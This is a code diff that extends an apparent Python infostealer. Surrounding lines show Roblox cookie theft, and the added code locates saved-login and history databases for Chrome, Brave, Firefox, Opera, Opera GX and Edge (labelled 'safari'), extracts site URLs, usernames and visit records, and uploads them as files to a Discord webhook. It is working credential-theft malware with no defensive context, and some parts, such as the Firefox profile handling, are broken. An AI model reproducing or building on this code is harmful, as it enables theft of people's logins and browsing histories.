@@ -261,23 +261,57 @@ def retrieve_roblox_cookies():
     except Exception as e:
         send_to_discord(f"❌ Unexpected error: {e}")
 
-def get_login_data_path():
+def is_browser_installed(browser):
+    user_profile = os.environ['USERPROFILE']
+    if browser == 'chrome':
+        return os.path.exists(os.path.join(user_profile, r"AppData\Local\Google\Chrome"))
+    elif browser == 'brave':
+        return os.path.exists(os.path.join(user_profile, r"AppData\Local\BraveSoftware\Brave-Browser"))
+    elif browser == 'firefox':
+        return os.path.exists(os.path.join(user_profile, r"AppData\Roaming\Mozilla\Firefox"))
+    elif browser == 'opera':
+        return os.path.exists(os.path.join(user_profile, r"AppData\Roaming\Opera Software\Opera Stable"))
+    elif browser == 'opera_gx':
+        return os.path.exists(os.path.join(user_profile, r"AppData\Roaming\Opera Software\Opera GX Stable"))
+    elif browser == 'safari':
+        return os.path.exists(os.path.join(user_profile, r"AppData\Local\Microsoft\Edge"))
+    return False
+
+def get_login_data_path(browser, profile):
     try:
         user_profile = os.environ['USERPROFILE']
-        base_path = os.path.join(user_profile, r"AppData\Local\Google\Chrome\User Data")
-        for profile in ["Default", "Profile 1", "Profile 2"]:
-            candidate = os.path.join(base_path, profile, "Login Data")
+        if browser == 'chrome':
+            base_path = os.path.join(user_profile, r"AppData\Local\Google\Chrome\User Data", profile)
+        elif browser == 'brave':
+            base_path = os.path.join(user_profile, r"AppData\Local\BraveSoftware\Brave-Browser\User Data", profile)
+        elif browser == 'firefox':
+            profiles_dir = os.path.join(user_profile, r"AppData\Roaming\Mozilla\Firefox\Profiles")
+            candidate = os.path.join(profiles_dir, profile, 'logins.json')
             if os.path.exists(candidate):
                 return candidate
-    except:
-        pass
+            return None
+        elif browser == 'opera':
+            base_path = os.path.join(user_profile, r"AppData\Roaming\Opera Software\Opera Stable")
+        elif browser == 'opera_gx':
+            base_path = os.path.join(user_profile, r"AppData\Roaming\Opera Software\Opera GX Stable")
+        elif browser == 'safari':
+            base_path = os.path.join(user_profile, r"AppData\Local\Microsoft\Edge\User Data", profile)
+        else:
+            return None
+
+        candidate = os.path.join(base_path, "Login Data")
+        if os.path.exists(candidate):
+            return candidate
+    except Exception as e:
+        print(f"Error getting login data path for {browser}: {e}")
     return None
 
 def copy_database(source_path, temp_path):
     try:
         shutil.copy2(source_path, temp_path)
         return True
-    except:
+    except Exception as e:
+        print(f"Error copying database: {e}")
         return False
 
 def extract_logins(db_path):
@@ -295,11 +329,12 @@ def extract_logins(db_path):
             try:
                 dt = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=timestamp)
                 iso_time = dt.isoformat()
-            except:
+            except Exception as e:
+                print(f"Error converting timestamp: {e}")
                 iso_time = "Unknown"
             results.append((url, username, iso_time))
-    except:
-        pass
+    except Exception as e:
+        print(f"Error extracting logins: {e}")
     return results
 
 def write_to_file(data, file_path):
@@ -307,95 +342,126 @@ def write_to_file(data, file_path):
         with open(file_path, 'w', encoding='utf-8') as f:
             for url, email, timestamp in data:
                 f.write(f"URL: {url}\nEmail: {email}\nSaved: {timestamp}\n\n")
-    except:
-        pass
+    except Exception as e:
+        print(f"Error writing to file: {e}")
 
-def send_file_to_discord(file_path):
+def send_file_to_discord(file_path, file_name):
     try:
         with open(file_path, 'rb') as f:
             files = {
-                'file': (os.path.basename(file_path), f)
+                'file': (file_name, f)
             }
             requests.post(WEBHOOK_URL, files=files)
-    except:
-        pass
-
-def collect_chrome_logins():
-    try:
-        original_db = get_login_data_path()
-        if not original_db:
-            return
-
-        temp_db = os.path.join(os.environ['TEMP'], "LoginData_Copy.db")
-        if not copy_database(original_db, temp_db):
-            return
-
-        logins = extract_logins(temp_db)
-        if not logins:
-            return
-
-        temp_txt = os.path.join(os.environ['TEMP'], "chrome_logins.txt")
-        write_to_file(logins, temp_txt)
-        send_file_to_discord(temp_txt)
-    except:
-        pass
-
-def get_size(bytes, suffix="B"):
-    factor = 1024
-    for unit in ["", "K", "M", "G", "T"]:
-        if bytes < factor:
-            return f"{bytes:.2f} {unit}{suffix}"
-        bytes /= factor
-
-def get_user_email():
-    try:
-        result = subprocess.run(
-            ["powershell", "-Command", "(Get-CimInstance -ClassName Win32_UserAccount | Where-Object {$_.LocalAccount -eq $false}).Name"],
-            capture_output=True, text=True
-        )
-        email = result.stdout.strip()
-        return email if email else "No Microsoft account email found"
     except Exception as e:
-        return f"Error: {e}"
+        print(f"Error sending file to Discord: {e}")
 
-def get_chrome_history(limit=100):
-    original_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History")
-    temp_path = os.path.join(tempfile.gettempdir(), "chrome_history_copy")
+def collect_browser_logins(browser, profile):
+    original_db = get_login_data_path(browser, profile)
+    if not original_db:
+        return
 
+    temp_db = os.path.join(os.environ['TEMP'], f"{browser}_{profile}_LoginData_Copy.db")
+    if not copy_database(original_db, temp_db):
+        return
+
+    logins = extract_logins(temp_db)
+    if not logins:
+        return
+
+    temp_txt = os.path.join(os.environ['TEMP'], f"{browser}_{profile}_logins.txt")
+    write_to_file(logins, temp_txt)
+    send_file_to_discord(temp_txt, f"{browser}_{profile}_logins.txt")
+
+def get_history_path(browser, profile):
+    user_profile = os.environ['USERPROFILE']
+    if browser == 'chrome':
+        base_path = os.path.join(user_profile, r"AppData\Local\Google\Chrome\User Data", profile)
+    elif browser == 'brave':
+        base_path = os.path.join(user_profile, r"AppData\Local\BraveSoftware\Brave-Browser\User Data", profile)
+    elif browser == 'firefox':
+        profiles_dir = os.path.join(user_profile, r"AppData\Roaming\Mozilla\Firefox\Profiles")
+        candidate = os.path.join(profiles_dir, profile, 'places.sqlite')
+        if os.path.exists(candidate):
+            return candidate
+        return None
+    elif browser == 'opera':
+        base_path = os.path.join(user_profile, r"AppData\Roaming\Opera Software\Opera Stable")
+    elif browser == 'opera_gx':
+        base_path = os.path.join(user_profile, r"AppData\Roaming\Opera Software\Opera GX Stable")
+    elif browser == 'safari':
+        base_path = os.path.join(user_profile, r"AppData\Local\Microsoft\Edge\User Data", profile)
+    else:
+        return None
+
+    candidate = os.path.join(base_path, "History")
+    if os.path.exists(candidate):
+        return candidate
+    return None
+
+def copy_and_access_db(source_db, temp_db):
     try:
-        shutil.copy2(original_path, temp_path)
-        conn = sqlite3.connect(temp_path)
+        if not os.path.exists(source_db):
+            return []
+        # Copy the history database to a temporary location
+        shutil.copyfile(source_db, temp_db)
+
+        conn = sqlite3.connect(temp_db)
         cursor = conn.cursor()
-
-        cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT ?", (limit,))
-        rows = cursor.fetchall()
-
-        history_lines = []
-        for url, title, timestamp in rows:
-            if timestamp is not None:
-                visit_time = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=timestamp)
-                history_lines.append(f"{visit_time.strftime('%Y-%m-%d %H:%M:%S')} - {title} ({url})")
-            else:
-                history_lines.append(f"Unknown time - {title} ({url})")
-
+        cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC")
+        history = cursor.fetchall()
         conn.close()
-        os.remove(temp_path)
-        return "\n".join(history_lines)
 
+        # Remove the temporary database file
+        os.remove(temp_db)
+
+        return history
     except Exception as e:
-        return f"Error accessing Chrome history: {e}"
+        print(f"Error accessing {source_db}: {e}")
+        return []
 
-def send_history_to_discord(history_text):
+def get_browser_history(browser, profile):
+    history_path = get_history_path(browser, profile)
+    if not history_path:
+        return ""
+
+    temp_db = os.path.join(os.environ['TEMP'], f"{browser}_{profile}_history_temp.db")
+    history = copy_and_access_db(history_path, temp_db)
+    history_text = "\n".join([f"{visit_time} - {title} ({url})" for url, title, visit_time in history])
+    return history_text
+
+def send_history_to_discord(history_text, browser, profile):
     with tempfile.NamedTemporaryFile("w+", delete=False, suffix=".txt", encoding="utf-8") as temp_file:
         temp_file.write(history_text)
         temp_file_path = temp_file.name
 
     with open(temp_file_path, "rb") as f:
-        files = {"file": (os.path.basename(temp_file_path), f)}
+        files = {"file": (f"{browser}_{profile}_history.txt", f)}
         response = requests.post(WEBHOOK_URL, files=files)
 
     os.remove(temp_file_path)
     return response.status_code
+
+def main():
+    browsers = {
+        'chrome': ['Default', 'Profile 1', 'Profile 2'],
+        'brave': ['Default', 'Profile 1', 'Profile 2'],
+        'firefox': ['*.default-release'],
+        'opera': [''],
+        'opera_gx': [''],
+        'safari': ['Default']
+    }
+
+    for browser, profiles in browsers.items():
+        if not is_browser_installed(browser):
+            continue
+
+        for profile in profiles:
+            if browser == 'firefox' and not profile.endswith('.default-release'):
+                continue
+            collect_browser_logins(browser, profile)
+            history_text = get_browser_history(browser, profile)
+            if history_text:
+                send_history_to_discord(history_text, browser, profile)
 
 def generate_key(length=20):
     characters = string.ascii_uppercase + string.digits
